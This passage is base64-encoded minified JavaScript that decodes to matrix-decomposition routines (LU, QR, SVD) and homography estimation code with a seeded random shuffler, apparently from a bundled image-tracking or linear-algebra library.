JbnZhbGlkIG1hdHJpeCBkaW1lbnNpb25zIik7aWYodGhpcy5pc1Npbmd1bGFyKCkpdGhyb3cgbmV3IEVycm9yKCJMVSBtYXRyaXggaXMgc2luZ3VsYXIiKTtsZXQgcz1uLmNvbHVtbnMscj1uLnN1Yk1hdHJpeFJvdyh0aGlzLnBpdm90VmVjdG9yLDAscy0xKSxpPWUuY29sdW1ucyxoLGwsdTtmb3IodT0wO3U8aTt1KyspZm9yKGg9dSsxO2g8aTtoKyspZm9yKGw9MDtsPHM7bCsrKXIuc2V0KGgsbCxyLmdldChoLGwpLXIuZ2V0KHUsbCkqZS5nZXQoaCx1KSk7Zm9yKHU9aS0xO3U+PTA7dS0tKXtmb3IobD0wO2w8cztsKyspci5zZXQodSxsLHIuZ2V0KHUsbCkvZS5nZXQodSx1KSk7Zm9yKGg9MDtoPHU7aCsrKWZvcihsPTA7bDxzO2wrKylyLnNldChoLGwsci5nZXQoaCxsKS1yLmdldCh1LGwpKmUuZ2V0KGgsdSkpfXJldHVybiByfWdldCBkZXRlcm1pbmFudCgpe2xldCBuPXRoaXMuTFU7aWYoIW4uaXNTcXVhcmUoKSl0aHJvdyBuZXcgRXJyb3IoIk1hdHJpeCBtdXN0IGJlIHNxdWFyZSIpO2xldCBlPXRoaXMucGl2b3RTaWduLHQ9bi5jb2x1bW5zO2ZvcihsZXQgcz0wO3M8dDtzKyspZSo9bi5nZXQocyxzKTtyZXR1cm4gZX1nZXQgbG93ZXJUcmlhbmd1bGFyTWF0cml4KCl7bGV0IG49dGhpcy5MVSxlPW4ucm93cyx0PW4uY29sdW1ucyxzPW5ldyBiKGUsdCk7Zm9yKGxldCByPTA7cjxlO3IrKylmb3IobGV0IGk9MDtpPHQ7aSsrKXI+aT9zLnNldChyLGksbi5nZXQocixpKSk6cj09PWk/cy5zZXQocixpLDEpOnMuc2V0KHIsaSwwKTtyZXR1cm4gc31nZXQgdXBwZXJUcmlhbmd1bGFyTWF0cml4KCl7bGV0IG49dGhpcy5MVSxlPW4ucm93cyx0PW4uY29sdW1ucyxzPW5ldyBiKGUsdCk7Zm9yKGxldCByPTA7cjxlO3IrKylmb3IobGV0IGk9MDtpPHQ7aSsrKXI8PWk/cy5zZXQocixpLG4uZ2V0KHIsaSkpOnMuc2V0KHIsaSwwKTtyZXR1cm4gc31nZXQgcGl2b3RQZXJtdXRhdGlvblZlY3Rvcigpe3JldHVybiBBcnJheS5mcm9tKHRoaXMucGl2b3RWZWN0b3IpfX1mdW5jdGlvbiB4KG8sbil7bGV0IGU9MDtyZXR1cm4gTWF0aC5hYnMobyk+TWF0aC5hYnMobik/KGU9bi9vLE1hdGguYWJzKG8pKk1hdGguc3FydCgxK2UqZSkpOm4hPT0wPyhlPW8vbixNYXRoLmFicyhuKSpNYXRoLnNxcnQoMStlKmUpKTowfWNsYXNzIHZle2NvbnN0cnVjdG9yKG4pe249c3QuY2hlY2tNYXRyaXgobik7bGV0IGU9bi5jbG9uZSgpLHQ9bi5yb3dzLHM9bi5jb2x1bW5zLHI9bmV3IEZsb2F0NjRBcnJheShzKSxpLGgsbCx1O2ZvcihsPTA7bDxzO2wrKyl7bGV0IGY9MDtmb3IoaT1sO2k8dDtpKyspZj14KGYsZS5nZXQoaSxsKSk7aWYoZiE9PTApe2ZvcihlLmdldChsLGwpPDAmJihmPS1mKSxpPWw7aTx0O2krKyllLnNldChpLGwsZS5nZXQoaSxsKS9mKTtmb3IoZS5zZXQobCxsLGUuZ2V0KGwsbCkrMSksaD1sKzE7aDxzO2grKyl7Zm9yKHU9MCxpPWw7aTx0O2krKyl1Kz1lLmdldChpLGwpKmUuZ2V0KGksaCk7Zm9yKHU9LXUvZS5nZXQobCxsKSxpPWw7aTx0O2krKyllLnNldChpLGgsZS5nZXQoaSxoKSt1KmUuZ2V0KGksbCkpfX1yW2xdPS1mfXRoaXMuUVI9ZSx0aGlzLlJkaWFnPXJ9c29sdmUobil7bj1iLmNoZWNrTWF0cml4KG4pO2xldCBlPXRoaXMuUVIsdD1lLnJvd3M7aWYobi5yb3dzIT09dCl0aHJvdyBuZXcgRXJyb3IoIk1hdHJpeCByb3cgZGltZW5zaW9ucyBtdXN0IGFncmVlIik7aWYoIXRoaXMuaXNGdWxsUmFuaygpKXRocm93IG5ldyBFcnJvcigiTWF0cml4IGlzIHJhbmsgZGVmaWNpZW50Iik7bGV0IHM9bi5jb2x1bW5zLHI9bi5jbG9uZSgpLGk9ZS5jb2x1bW5zLGgsbCx1LGY7Zm9yKHU9MDt1PGk7dSsrKWZvcihsPTA7bDxzO2wrKyl7Zm9yKGY9MCxoPXU7aDx0O2grKylmKz1lLmdldChoLHUpKnIuZ2V0KGgsbCk7Zm9yKGY9LWYvZS5nZXQodSx1KSxoPXU7aDx0O2grKylyLnNldChoLGwsci5nZXQoaCxsKStmKmUuZ2V0KGgsdSkpfWZvcih1PWktMTt1Pj0wO3UtLSl7Zm9yKGw9MDtsPHM7bCsrKXIuc2V0KHUsbCxyLmdldCh1LGwpL3RoaXMuUmRpYWdbdV0pO2ZvcihoPTA7aDx1O2grKylmb3IobD0wO2w8cztsKyspci5zZXQoaCxsLHIuZ2V0KGgsbCktci5nZXQodSxsKSplLmdldChoLHUpKX1yZXR1cm4gci5zdWJNYXRyaXgoMCxpLTEsMCxzLTEpfWlzRnVsbFJhbmsoKXtsZXQgbj10aGlzLlFSLmNvbHVtbnM7Zm9yKGxldCBlPTA7ZTxuO2UrKylpZih0aGlzLlJkaWFnW2VdPT09MClyZXR1cm4hMTtyZXR1cm4hMH1nZXQgdXBwZXJUcmlhbmd1bGFyTWF0cml4KCl7bGV0IG49dGhpcy5RUixlPW4uY29sdW1ucyx0PW5ldyBiKGUsZSkscyxyO2ZvcihzPTA7czxlO3MrKylmb3Iocj0wO3I8ZTtyKyspczxyP3Quc2V0KHMscixuLmdldChzLHIpKTpzPT09cj90LnNldChzLHIsdGhpcy5SZGlhZ1tzXSk6dC5zZXQocyxyLDApO3JldHVybiB0fWdldCBvcnRob2dvbmFsTWF0cml4KCl7bGV0IG49dGhpcy5RUixlPW4ucm93cyx0PW4uY29sdW1ucyxzPW5ldyBiKGUsdCkscixpLGgsbDtmb3IoaD10LTE7aD49MDtoLS0pe2ZvcihyPTA7cjxlO3IrKylzLnNldChyLGgsMCk7Zm9yKHMuc2V0KGgsaCwxKSxpPWg7aTx0O2krKylpZihuLmdldChoLGgpIT09MCl7Zm9yKGw9MCxyPWg7cjxlO3IrKylsKz1uLmdldChyLGgpKnMuZ2V0KHIsaSk7Zm9yKGw9LWwvbi5nZXQoaCxoKSxyPWg7cjxlO3IrKylzLnNldChyLGkscy5nZXQocixpKStsKm4uZ2V0KHIsaCkpfX1yZXR1cm4gc319Y2xhc3MgRHR7Y29uc3RydWN0b3IobixlPXt9KXtpZihuPXN0LmNoZWNrTWF0cml4KG4pLG4uaXNFbXB0eSgpKXRocm93IG5ldyBFcnJvcigiTWF0cml4IG11c3QgYmUgbm9uLWVtcHR5Iik7bGV0IHQ9bi5yb3dzLHM9bi5jb2x1bW5zO2NvbnN0e2NvbXB1dGVMZWZ0U2luZ3VsYXJWZWN0b3JzOnI9ITAsY29tcHV0ZVJpZ2h0U2luZ3VsYXJWZWN0b3JzOmk9ITAsYXV0b1RyYW5zcG9zZTpoPSExfT1lO2xldCBsPSEhcix1PSEhaSxmPSExLGc7aWYodDxzKWlmKCFoKWc9bi5jbG9uZSgpLGNvbnNvbGUud2FybigiQ29tcHV0aW5nIFNWRCBvbiBhIG1hdHJpeCB3aXRoIG1vcmUgY29sdW1ucyB0aGFuIHJvd3MuIENvbnNpZGVyIGVuYWJsaW5nIGF1dG9UcmFuc3Bvc2UiKTtlbHNle2c9bi50cmFuc3Bvc2UoKSx0PWcucm93cyxzPWcuY29sdW1ucyxmPSEwO2xldCBjPWw7bD11LHU9Y31lbHNlIGc9bi5jbG9uZSgpO2xldCBhPU1hdGgubWluKHQscyksaj1NYXRoLm1pbih0KzEscyksdz1uZXcgRmxvYXQ2NEFycmF5KGopLHk9bmV3IGIodCxhKSxtPW5ldyBiKHMscyksTT1uZXcgRmxvYXQ2NEFycmF5KHMpLFQ9bmV3IEZsb2F0NjRBcnJheSh0KSxFPW5ldyBGbG9hdDY0QXJyYXkoaik7Zm9yKGxldCBjPTA7YzxqO2MrKylFW2NdPWM7bGV0IGs9TWF0aC5taW4odC0xLHMpLFI9TWF0aC5tYXgoMCxNYXRoLm1pbihzLTIsdCkpLHE9TWF0aC5tYXgoayxSKTtmb3IobGV0IGM9MDtjPHE7YysrKXtpZihjPGspe3dbY109MDtmb3IobGV0IHA9YztwPHQ7cCsrKXdbY109eCh3W2NdLGcuZ2V0KHAsYykpO2lmKHdbY10hPT0wKXtnLmdldChjLGMpPDAmJih3W2NdPS13W2NdKTtmb3IobGV0IHA9YztwPHQ7cCsrKWcuc2V0KHAsYyxnLmdldChwLGMpL3dbY10pO2cuc2V0KGMsYyxnLmdldChjLGMpKzEpfXdbY109LXdbY119Zm9yKGxldCBwPWMrMTtwPHM7cCsrKXtpZihjPGsmJndbY10hPT0wKXtsZXQgUz0wO2ZvcihsZXQgZD1jO2Q8dDtkKyspUys9Zy5nZXQoZCxjKSpnLmdldChkLHApO1M9LVMvZy5nZXQoYyxjKTtmb3IobGV0IGQ9YztkPHQ7ZCsrKWcuc2V0KGQscCxnLmdldChkLHApK1MqZy5nZXQoZCxjKSl9TVtwXT1nLmdldChjLHApfWlmKGwmJmM8aylmb3IobGV0IHA9YztwPHQ7cCsrKXkuc2V0KHAsYyxnLmdldChwLGMpKTtpZihjPFIpe01bY109MDtmb3IobGV0IHA9YysxO3A8cztwKyspTVtjXT14KE1bY10sTVtwXSk7aWYoTVtjXSE9PTApe01bYysxXTwwJiYoTVtjXT0wLU1bY10pO2ZvcihsZXQgcD1jKzE7cDxzO3ArKylNW3BdLz1NW2NdO01bYysxXSs9MX1pZihNW2NdPS1NW2NdLGMrMTx0JiZNW2NdIT09MCl7Zm9yKGxldCBwPWMrMTtwPHQ7cCsrKVRbcF09MDtmb3IobGV0IHA9YysxO3A8dDtwKyspZm9yKGxldCBTPWMrMTtTPHM7UysrKVRbcF0rPU1bU10qZy5nZXQocCxTKTtmb3IobGV0IHA9YysxO3A8cztwKyspe2xldCBTPS1NW3BdL01bYysxXTtmb3IobGV0IGQ9YysxO2Q8dDtkKyspZy5zZXQoZCxwLGcuZ2V0KGQscCkrUypUW2RdKX19aWYodSlmb3IobGV0IHA9YysxO3A8cztwKyspbS5zZXQocCxjLE1bcF0pfX1sZXQgST1NYXRoLm1pbihzLHQrMSk7aWYoazxzJiYod1trXT1nLmdldChrLGspKSx0PEkmJih3W0ktMV09MCksUisxPEkmJihNW1JdPWcuZ2V0KFIsSS0xKSksTVtJLTFdPTAsbCl7Zm9yKGxldCBjPWs7YzxhO2MrKyl7Zm9yKGxldCBwPTA7cDx0O3ArKyl5LnNldChwLGMsMCk7eS5zZXQoYyxjLDEpfWZvcihsZXQgYz1rLTE7Yz49MDtjLS0paWYod1tjXSE9PTApe2ZvcihsZXQgcD1jKzE7cDxhO3ArKyl7bGV0IFM9MDtmb3IobGV0IGQ9YztkPHQ7ZCsrKVMrPXkuZ2V0KGQsYykqeS5nZXQoZCxwKTtTPS1TL3kuZ2V0KGMsYyk7Zm9yKGxldCBkPWM7ZDx0O2QrKyl5LnNldChkLHAseS5nZXQoZCxwKStTKnkuZ2V0KGQsYykpfWZvcihsZXQgcD1jO3A8dDtwKyspeS5zZXQocCxjLC15LmdldChwLGMpKTt5LnNldChjLGMsMSt5LmdldChjLGMpKTtmb3IobGV0IHA9MDtwPGMtMTtwKyspeS5zZXQocCxjLDApfWVsc2V7Zm9yKGxldCBwPTA7cDx0O3ArKyl5LnNldChwLGMsMCk7eS5zZXQoYyxjLDEpfX1pZih1KWZvcihsZXQgYz1zLTE7Yz49MDtjLS0pe2lmKGM8UiYmTVtjXSE9PTApZm9yKGxldCBwPWMrMTtwPHM7cCsrKXtsZXQgUz0wO2ZvcihsZXQgZD1jKzE7ZDxzO2QrKylTKz1tLmdldChkLGMpKm0uZ2V0KGQscCk7Uz0tUy9tLmdldChjKzEsYyk7Zm9yKGxldCBkPWMrMTtkPHM7ZCsrKW0uc2V0KGQscCxtLmdldChkLHApK1MqbS5nZXQoZCxjKSl9Zm9yKGxldCBwPTA7cDxzO3ArKyltLnNldChwLGMsMCk7bS5zZXQoYyxjLDEpfWxldCB6PUktMSxCPU51bWJlci5FUFNJTE9OO2Zvcig7ST4wOyl7bGV0IGMscDtmb3IoYz1JLTI7Yz49LTEmJmMhPT0tMTtjLS0pe2NvbnN0IFM9TnVtYmVyLk1JTl9WQUxVRStCKk1hdGguYWJzKHdbY10rTWF0aC5hYnMod1tjKzFdKSk7aWYoTWF0aC5hYnMoTVtjXSk8PVN8fE51bWJlci5pc05hTihNW2NdKSl7TVtjXT0wO2JyZWFrfX1pZihjPT09SS0yKXA9NDtlbHNle2xldCBTO2ZvcihTPUktMTtTPj1jJiZTIT09YztTLS0pe2xldCBkPShTIT09ST9NYXRoLmFicyhNW1NdKTowKSsoUyE9PWMrMT9NYXRoLmFicyhNW1MtMV0pOjApO2lmKE1hdGguYWJzKHdbU10pPD1CKmQpe3dbU109MDticmVha319Uz09PWM/cD0zOlM9PT1JLTE/cD0xOihwPTIsYz1TKX1zd2l0Y2goYysrLHApe2Nhc2UgMTp7bGV0IFM9TVtJLTJdO01bSS0yXT0wO2ZvcihsZXQgZD1JLTI7ZD49YztkLS0pe2xldCBEPXgod1tkXSxTKSxVPXdbZF0vRCxGPVMvRDtpZih3W2RdPUQsZCE9PWMmJihTPS1GKk1bZC0xXSxNW2QtMV09VSpNW2QtMV0pLHUpZm9yKGxldCBQPTA7UDxzO1ArKylEPVUqbS5nZXQoUCxkKStGKm0uZ2V0KFAsSS0xKSxtLnNldChQLEktMSwtRiptLmdldChQLGQpK1UqbS5nZXQoUCxJLTEpKSxtLnNldChQLGQsRCl9YnJlYWt9Y2FzZSAyOntsZXQgUz1NW2MtMV07TVtjLTFdPTA7Zm9yKGxldCBkPWM7ZDxJO2QrKyl7bGV0IEQ9eCh3W2RdLFMpLFU9d1tkXS9ELEY9Uy9EO2lmKHdbZF09RCxTPS1GKk1bZF0sTVtkXT1VKk1bZF0sbClmb3IobGV0IFA9MDtQPHQ7UCsrKUQ9VSp5LmdldChQLGQpK0YqeS5nZXQoUCxjLTEpLHkuc2V0KFAsYy0xLC1GKnkuZ2V0KFAsZCkrVSp5LmdldChQLGMtMSkpLHkuc2V0KFAsZCxEKX1icmVha31jYXNlIDM6e2NvbnN0IFM9TWF0aC5tYXgoTWF0aC5hYnMod1tJLTFdKSxNYXRoLmFicyh3W0ktMl0pLE1hdGguYWJzKE1bSS0yXSksTWF0aC5hYnMod1tjXSksTWF0aC5hYnMoTVtjXSkpLGQ9d1tJLTFdL1MsRD13W0ktMl0vUyxVPU1bSS0yXS9TLEY9d1tjXS9TLFA9TVtjXS9TLFk9KChEK2QpKihELWQpK1UqVSkvMixHPWQqVSooZCpVKTtsZXQgTj0wOyhZIT09MHx8RyE9PTApJiYoWTwwP049MC1NYXRoLnNxcnQoWSpZK0cpOk49TWF0aC5zcXJ0KFkqWStHKSxOPUcvKFkrTikpO2xldCAkPShGK2QpKihGLWQpK04sSz1GKlA7Zm9yKGxldCB2PWM7djxJLTE7disrKXtsZXQgVj14KCQsSyk7Vj09PTAmJihWPU51bWJlci5NSU5fVkFMVUUpO2xldCBMPSQvVixDPUsvVjtpZih2IT09YyYmKE1bdi0xXT1WKSwkPUwqd1t2XStDKk1bdl0sTVt2XT1MKk1bdl0tQyp3W3ZdLEs9Qyp3W3YrMV0sd1t2KzFdPUwqd1t2KzFdLHUpZm9yKGxldCBYPTA7WDxzO1grKylWPUwqbS5nZXQoWCx2KStDKm0uZ2V0KFgsdisxKSxtLnNldChYLHYrMSwtQyptLmdldChYLHYpK0wqbS5nZXQoWCx2KzEpKSxtLnNldChYLHYsVik7aWYoVj14KCQsSyksVj09PTAmJihWPU51bWJlci5NSU5fVkFMVUUpLEw9JC9WLEM9Sy9WLHdbdl09ViwkPUwqTVt2XStDKndbdisxXSx3W3YrMV09LUMqTVt2XStMKndbdisxXSxLPUMqTVt2KzFdLE1bdisxXT1MKk1bdisxXSxsJiZ2PHQtMSlmb3IobGV0IFg9MDtYPHQ7WCsrKVY9TCp5LmdldChYLHYpK0MqeS5nZXQoWCx2KzEpLHkuc2V0KFgsdisxLC1DKnkuZ2V0KFgsdikrTCp5LmdldChYLHYrMSkpLHkuc2V0KFgsdixWKX1NW0ktMl09JDticmVha31jYXNlIDQ6e2lmKHdbY108PTAmJih3W2NdPXdbY108MD8td1tjXTowLHUpKWZvcihsZXQgUz0wO1M8PXo7UysrKW0uc2V0KFMsYywtbS5nZXQoUyxjKSk7Zm9yKDtjPHomJiEod1tjXT49d1tjKzFdKTspe2xldCBTPXdbY107aWYod1tjXT13W2MrMV0sd1tjKzFdPVMsdSYmYzxzLTEpZm9yKGxldCBkPTA7ZDxzO2QrKylTPW0uZ2V0KGQsYysxKSxtLnNldChkLGMrMSxtLmdldChkLGMpKSxtLnNldChkLGMsUyk7aWYobCYmYzx0LTEpZm9yKGxldCBkPTA7ZDx0O2QrKylTPXkuZ2V0KGQsYysxKSx5LnNldChkLGMrMSx5LmdldChkLGMpKSx5LnNldChkLGMsUyk7YysrfUktLTticmVha319fWlmKGYpe2xldCBjPW07bT15LHk9Y310aGlzLm09dCx0aGlzLm49cyx0aGlzLnM9dyx0aGlzLlU9eSx0aGlzLlY9bX1zb2x2ZShuKXtsZXQgZT1uLHQ9dGhpcy50aHJlc2hvbGQscz10aGlzLnMubGVuZ3RoLHI9Yi56ZXJvcyhzLHMpO2ZvcihsZXQgYT0wO2E8czthKyspTWF0aC5hYnModGhpcy5zW2FdKTw9dD9yLnNldChhLGEsMCk6ci5zZXQoYSxhLDEvdGhpcy5zW2FdKTtsZXQgaT10aGlzLlUsaD10aGlzLnJpZ2h0U2luZ3VsYXJWZWN0b3JzLGw9aC5tbXVsKHIpLHU9aC5yb3dzLGY9aS5yb3dzLGc9Yi56ZXJvcyh1LGYpO2ZvcihsZXQgYT0wO2E8dTthKyspZm9yKGxldCBqPTA7ajxmO2orKyl7bGV0IHc9MDtmb3IobGV0IHk9MDt5PHM7eSsrKXcrPWwuZ2V0KGEseSkqaS5nZXQoaix5KTtnLnNldChhLGosdyl9cmV0dXJuIGcubW11bChlKX1zb2x2ZUZvckRpYWdvbmFsKG4pe3JldHVybiB0aGlzLnNvbHZlKGIuZGlhZyhuKSl9aW52ZXJzZSgpe2xldCBuPXRoaXMuVixlPXRoaXMudGhyZXNob2xkLHQ9bi5yb3dzLHM9bi5jb2x1bW5zLHI9bmV3IGIodCx0aGlzLnMubGVuZ3RoKTtmb3IobGV0IGY9MDtmPHQ7ZisrKWZvcihsZXQgZz0wO2c8cztnKyspTWF0aC5hYnModGhpcy5zW2ddKT5lJiZyLnNldChmLGcsbi5nZXQoZixnKS90aGlzLnNbZ10pO2xldCBpPXRoaXMuVSxoPWkucm93cyxsPWkuY29sdW1ucyx1PW5ldyBiKHQsaCk7Zm9yKGxldCBmPTA7Zjx0O2YrKylmb3IobGV0IGc9MDtnPGg7ZysrKXtsZXQgYT0wO2ZvcihsZXQgaj0wO2o8bDtqKyspYSs9ci5nZXQoZixqKSppLmdldChnLGopO3Uuc2V0KGYsZyxhKX1yZXR1cm4gdX1nZXQgY29uZGl0aW9uKCl7cmV0dXJuIHRoaXMuc1swXS90aGlzLnNbTWF0aC5taW4odGhpcy5tLHRoaXMubiktMV19Z2V0IG5vcm0yKCl7cmV0dXJuIHRoaXMuc1swXX1nZXQgcmFuaygpe2xldCBuPU1hdGgubWF4KHRoaXMubSx0aGlzLm4pKnRoaXMuc1swXSpOdW1iZXIuRVBTSUxPTixlPTAsdD10aGlzLnM7Zm9yKGxldCBzPTAscj10Lmxlbmd0aDtzPHI7cysrKXRbc10+biYmZSsrO3JldHVybiBlfWdldCBkaWFnb25hbCgpe3JldHVybiBBcnJheS5mcm9tKHRoaXMucyl9Z2V0IHRocmVzaG9sZCgpe3JldHVybiBOdW1iZXIuRVBTSUxPTi8yKk1hdGgubWF4KHRoaXMubSx0aGlzLm4pKnRoaXMuc1swXX1nZXQgbGVmdFNpbmd1bGFyVmVjdG9ycygpe3JldHVybiB0aGlzLlV9Z2V0IHJpZ2h0U2luZ3VsYXJWZWN0b3JzKCl7cmV0dXJuIHRoaXMuVn1nZXQgZGlhZ29uYWxNYXRyaXgoKXtyZXR1cm4gYi5kaWFnKHRoaXMucyl9fWZ1bmN0aW9uIE10KG8sbj0hMSl7cmV0dXJuIG89c3QuY2hlY2tNYXRyaXgobyksbj9uZXcgRHQobykuaW52ZXJzZSgpOnFlKG8sYi5leWUoby5yb3dzKSl9ZnVuY3Rpb24gcWUobyxuLGU9ITEpe3JldHVybiBvPXN0LmNoZWNrTWF0cml4KG8pLG49c3QuY2hlY2tNYXRyaXgobiksZT9uZXcgRHQobykuc29sdmUobik6by5pc1NxdWFyZSgpP25ldyBOZShvKS5zb2x2ZShuKTpuZXcgdmUobykuc29sdmUobil9Y29uc3QgX2U9MTIzNCxUZT0oKT0+KHtzZWVkOl9lLGFycmF5U2h1ZmZsZShuKXtjb25zdHthcnI6ZSxzYW1wbGVTaXplOnR9PW47Zm9yKGxldCBzPTA7czx0O3MrKyl7dGhpcy5zZWVkPSgyMTQwMTMqdGhpcy5zZWVkKzI1MzEwMTEpJS0yMTQ3NDgzNjQ4O2xldCByPXRoaXMuc2VlZD4+MTYmMzI3Njc7cj1yJWUubGVuZ3RoO2xldCBpPWVbc107ZVtzXT1lW3JdLGVbcl09aX19LG5leHRJbnQobil7dGhpcy5zZWVkPSgyMTQwMTMqdGhpcy5zZWVkKzI1MzEwMTEpJS0yMTQ3NDgzNjQ4O2xldCBlPXRoaXMuc2VlZD4+MTYmMzI3Njc7cmV0dXJuIGU9ZSVuLGV9fSksSj0obyxuLGUpPT4oblswXS1vWzBdKSooZVsxXS1vWzFdKS0oblsxXS1vWzFdKSooZVswXS1vWzBdKSx6ZT0obyxuLGUsdCxzLHIsaSxoKT0+IShKKG8sbixlKT4wIT1KKHMscixpKT4wfHxKKG4sZSx0KT4wIT1KKHIsaSxoKT4wfHxKKGUsdCxvKT4wIT1KKGksaCxzKT4wfHxKKHQsbyxuKT4wIT1KKGgscyxyKT4wKSxGZT0obyxuLGUsdCxzLHIpPT5KKG8sbixlKT4wPT1KKHQscyxyKT4wLFBlPW89Pntjb25zdCBuPW9bNF0qb1s4XS1vWzVdKm9bN10sZT1vWzNdKm9bOF0tb1s1XSpvWzZdLHQ9b1szXSpvWzddLW9bNF0qb1s2XTtyZXR1cm4gb1swXSpuLW9bMV0qZStvWzJdKnR9LEJ0PShvLG4pPT57Y29uc3QgZT1QZShvKTtpZihNYXRoLmFicyhlKTw9bilyZXR1cm4gbnVsbDtjb25zdCB0PTEvZTtyZXR1cm5bKG9bNF0qb1s4XS1vWzVdKm9bN10pKnQsKG9bMl0qb1s3XS1vWzFdKm9bOF0pKnQsKG9bMV0qb1s1XS1vWzJdKm9bNF0pKnQsKG9bNV0qb1s2XS1vWzNdKm9bOF0pKnQsKG9bMF0qb1s4XS1vWzJdKm9bNl0pKnQsKG9bMl0qb1szXS1vWzBdKm9bNV0pKnQsKG9bM10qb1s3XS1vWzRdKm9bNl0pKnQsKG9bMV0qb1s2XS1vWzBdKm9bN10pKnQsKG9bMF0qb1s0XS1vWzFdKm9bM10pKnRdfSxvdD0obyxuKT0+e2NvbnN0IGU9bls2XSpvWzBdK25bN10qb1sxXStuWzhdLHQ9W107cmV0dXJuIHRbMF09KG5bMF0qb1swXStuWzFdKm9bMV0rblsyXSkvZSx0WzFdPShuWzNdKm9bMF0rbls0XSpvWzFdK25bNV0pL2UsdH0sRGU9KG8sbixlLHQpPT57Y29uc3Qgcz1ydChuLG8pLHI9cnQoZSxvKSxpPXJ0KHQsbyksaD1ydChuLGUpLGw9cnQodCxlKSx1PW10KHMsciksZj1tdChyLGkpLGc9bXQocyxpKSxhPW10KGgsbCk7cmV0dXJuIE1hdGgubWluKE1hdGgubWluKE1hdGgubWluKHUsZiksZyksYSl9LEJlPShvLG4sZSx0KT0+e2NvbnN0IHM9SihvLG4sZSk8PTA7cmV0dXJuIShKKG4sZSx0KTw9MCE9PXN8fEooZSx0LG8pPD0wIT09c3x8Sih0LG8sbik8PTAhPT1zKX0scnQ9KG8sbik9PltvWzBdLW5bMF0sb1sxXS1uWzFdXSxtdD0obyxuKT0+e2NvbnN0IGU9b1swXSpuWzFdLW9bMV0qblswXTtyZXR1cm4gTWF0aC5hYnMoZSkqLjV9LFZ0PShvLG4pPT57Y29uc3R7bm9ybVBvaW50czplLHBhcmFtOnR9PVh0KG8pLHtub3JtUG9pbnRzOnMscGFyYW06cn09WHQobiksaT1zLmxlbmd0aCxoPVtdLGw9W107Zm9yKGxldCB1PTA7dTxpO3UrKyl7Y29uc3QgZj1bZVt1XVswXSxlW3VdWzFdLDEsMCwwLDAsLShlW3VdWzBdKnNbdV1bMF0pLC0oZVt1XVsxXSpzW3VdWzBdKV0sZz1bMCwwLDAsZVt1XVswXSxlW3VdWzFdLDEsLShlW3VdWzBdKnNbdV1bMV0pLC0oZVt1XVsxXSpzW3VdWzFdKV07aC5wdXNoKGYpLGgucHVzaChnKSxsLnB1c2goW3NbdV1bMF1dKSxsLnB1c2goW3NbdV1bMV1dKX10cnl7Y29uc3QgdT1uZXcgYihoKSxmPW5ldyBiKGwpLGc9dS50cmFuc3Bvc2UoKSxhPWcubW11bCh1KSxqPWcubW11bChmKSx5PU10KGEpLm1tdWwoaikudG8xREFycmF5KCk7cmV0dXJuIFZlKHksdCxyKX1jYXRjaHtyZXR1cm4gbnVsbH19LFh0PW89PntsZXQgbj0wLGU9MDtmb3IobGV0IGw9MDtsPG8ubGVuZ3RoO2wrKyluKz1vW2xdWzBdLGUrPW9bbF1bMV07bGV0IHQ9bi9vLmxlbmd0aCxzPWUvby5sZW5ndGgscj0wO2ZvcihsZXQgbD0wO2w8by5sZW5ndGg7bCsrKXtjb25zdCB1PW9bbF1bMF0tdCxmPW9bbF1bMV0tcztyKz1NYXRoLnNxcnQodSp1K2YqZil9bGV0IGk9TWF0aC5zcXJ0KDIpKm8ubGVuZ3RoL3I7Y29uc3QgaD1bXTtmb3IobGV0IGw9MDtsPG8ubGVuZ3RoO2wrKyloLnB1c2goWyhvW2xdWzBdLXQpKmksKG9bbF1bMV0tcykqaV0pO3JldHVybntub3JtUG9pbnRzOmgscGFyYW06e21lYW5YOnQsbWVhblk6cyxzOml9fX0sVmU9KG8sbixlKT0+e2NvbnN0IHQ9ZS5zKmUubWVhblgscz1lLnMqZS5tZWFuWSxyPVtvWzBdK3Qqb1s2XSxvWzFdK3Qqb1s3XSwob1swXSt0Km9bNl0pKi1uLm1lYW5YKyhvWzFdK3Qqb1s3XSkqLW4ubWVhblkrKG9bMl0rdCkvbi5zLG9bM10rcypvWzZdLG9bNF0rcypvWzddLChvWzNdK3Mqb1s2XSkqLW4ubWVhblgrKG9bNF0rcypvWzddKSotbi5tZWFuWSsob1s1XStzKS9uLnMsZS5zKm9bNl0sZS5zKm9bN10sZS5zKm9bNl0qLW4ubWVhblgrZS5zKm9bN10qLW4ubWVhblkrZS5zL24uc107Zm9yKGxldCBpPTA7aTw5O2krKylyW2ldPXJbaV0vcls4XTtyZXR1cm4gcn0sWGU9LjAxLFVlPTEwLCRlPTIwLExlPTEwLFV0PW89Pntjb25zdHtzcmNQb2ludHM6bixkc3RQb2ludHM6ZSxrZXlmcmFtZTp0LHF1aWNrTW9kZTpzfT1vLHI9W1swLDBdLFt0LndpZHRoLDBdLFt0LndpZHRoLHQuaGVpZ2h0XSxbMCx0LmhlaWdodF1dLGk9NDtpZihuLmxlbmd0aDxpKXJldHVybiBudWxsO2NvbnN0IGg9WGUsbD0xLyhoKmgpLHU9TWF0aC5taW4oVWUsbi5sZW5ndGgpLGY9VGUoKSxnPVtdO2ZvcihsZXQgRT0wO0U8bi5sZW5ndGg7RSsrKWdbRV09RTtmLmFycmF5U2h1ZmZsZSh7YXJyOmcsc2FtcGxlU2l6ZTpnLmxlbmd0aH0pO2NvbnN0IGE9cz9MZTokZSxqPWEqMjtsZXQgdz0wO2NvbnN0IHk9W107Zm9yKDt3PGomJnkubGVuZ3RoPGE7KXtpZih3Kz0xLGYuYXJyYXlTaHVmZmxlKHthcnI6ZyxzYW1wbGVTaXplOml9KSwhemUobltnWzBdXSxuW2dbMV1dLG5bZ1syXV0sbltnWzNdXSxlW2dbMF1dLGVbZ1sxXV0sZVtnWzJdXSxlW2dbM11dKSljb250aW51ZTtjb25zdCBFPVZ0KFtuW2dbMF1dLG5bZ1sxXV0sbltnWzJdXSxuW2dbM11dXSxbZVtnWzBdXSxlW2dbMV1dLGVbZ1syXV0sZVtnWzNdXV0pO0UhPT1udWxsJiZIZSh7SDpFLHRlc3RQb2ludHM6cn0pJiZ5LnB1c2goRSl9aWYoeS5sZW5ndGg9PT0wKXJldHVybiBudWxsO2NvbnN0IG09W107Zm9yKGxldCBFPTA7RTx5Lmxlbmd0aDtFKyspbS5wdXNoKHtIOnlbRV0sY29zdDowfSk7bGV0IE09dTtmb3IobGV0IEU9MDtFPG4ubGVuZ3RoJiZtLmxlbmd0aD4yO0UrPU0pe009TWF0aC5taW4odSxuLmxlbmd0aC1FKTtsZXQgaz1FK007Zm9yKGxldCBSPTA7UjxtLmxlbmd0aDtSKyspZm9yKGxldCBxPUU7cTxrO3ErKyl7Y29uc3QgST1DZS